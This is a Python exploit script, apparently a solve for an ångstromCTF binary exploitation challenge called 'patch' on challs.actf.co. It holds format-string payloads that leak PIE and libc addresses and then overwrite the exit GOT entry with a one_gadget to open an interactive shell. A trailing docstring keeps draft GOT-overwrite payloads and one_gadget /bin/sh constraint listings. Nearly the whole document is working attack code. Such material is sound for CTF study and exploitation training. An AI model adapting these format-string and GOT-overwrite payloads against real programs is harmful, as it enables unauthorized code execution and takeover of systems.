#!/usr/bin/python3
# -*- coding: utf-8 -*-
# Author := 4n0nym4u5

from rootkit import *
from time import sleep

exe  = context.binary = ELF('./patch')
host = args.HOST or 'challs.actf.co'
port = int(args.PORT or 31228)

gdbscript = '''
tbreak main
b *main+533
continue
continue
continue
'''.format(**locals())

libc=ELF("./libc.so.6")
for i in range(1,100):
	try:
		info(str(i) + " TRIAL")
		io = start()
		
		payload=f"%{(0x69)}c%16$hhn%{1}$p"
		sla(b"Name: ", payload)
		sla(b"Pick your driver: ", b"-3")
		reu(b"Hi, this is ")
		exe.address = uu64(ren(6))-0x35a8
		pb()
		sla(b"So... tell me a little about yourself: ", p(exe.address+0x3300) + p(exe.address+0x3300+2) + p(exe.address+0x3300+4) + p(0xdeadbeef) )
		sleep(5)
		reu(b"0x")
		# reu(b"Well we're here. Bye,                                                                                                         0")
		sleep(5)
		# reu(b"       \x00")
		libc.address=int(b"0x" + ren(12), 16)#-0x1fd9f1
		# libc.address = GetInt(re())[0]-0x1fd9f1
		# reu(b"!")
		lb()
		pause()
	except:
		pass
	io.close()

# payload=fmtstr_payload(11, {exe.got.exit : libc.sym.system}, write_size='short')
ofst=(libc.address+0x491ff+117&0x00000000ffff)
payload=""
pop_4 = libc.address+0x460a3
payload+=(f"%{(libc.address+0x0000000002ff37-0xd9d&0x00000000ffff)}c%16$hn")
# payload+="aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaa"
payload+="AAA"
payload=payload.encode('utf-8')
payload+=p(0)
payload+=p(libc.address+0xe3b31)
# payload+=p(0x12345678)
# payload+=
# payload+=(f"%{(libc.address+0x000000000bb94c&0x000000ff0000)>>16}c%17$hhn")
# payload+=(f"%{((0xdeadbeef&0xffff00000000)-len(payload))>>32}c%18$hn")


sla(b"Name: ", payload)
re()
sl(b"0")
re()
sl(p(exe.got.exit) + p(exe.got.exit+2) + p(exe.got.exit+4) + p(0xdeadbeef))
re()
info(hex(libc.address+0x000000000bb94c))
io.interactive()

"""

one_gad = libc.sym.system
add_book(f"%{(one_gad&0x00000000ffff)}c%22$hn")
add_book(f"%{(one_gad&0x0000ffff0000)>>16}c%23$hn")
add_book(f"%{(one_gad&0xffff00000000)>>32}c%24$hn")
add_book(f"/bin/sh\x00")


0x7fec99297e39 posix_spawn(rsp+0xc, "/bin/sh", 0, rbp, rsp+0x50, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL
  rbp == NULL || (u16)[rbp] == NULL

0x7fec99297e45 posix_spawn(rsp+0xc, "/bin/sh", rdx, rbp, rsp+0x50, environ)
constraints:
  rsp & 0xf == 0
  (u64)xmm0 == NULL
  rdx == NULL || (s32)[rdx+0x4] <= 0
  rbp == NULL || (u16)[rbp] == NULL

0x7fec99297e5a posix_spawn(rdi, "/bin/sh", rdx, rbp, r8, [rax])
constraints:
  rsp & 0xf == 0
  [r8] == NULL
  [[rax]] == NULL || [rax] == NULL
  rdi == NULL || writable: rdi
  rdx == NULL || (s32)[rdx+0x4] <= 0
  rbp == NULL || (u16)[rbp] == NULL

0x7fec99297e62 posix_spawn(rdi, "/bin/sh", rdx, rcx, r8, [rax])
constraints:
  rsp & 0xf == 0
  [r8] == NULL
  [[rax]] == NULL || [rax] == NULL
  rdi == NULL || writable: rdi
  rdx == NULL || (s32)[rdx+0x4] <= 0
  rcx == NULL || (u16)[rcx] == NULL

"""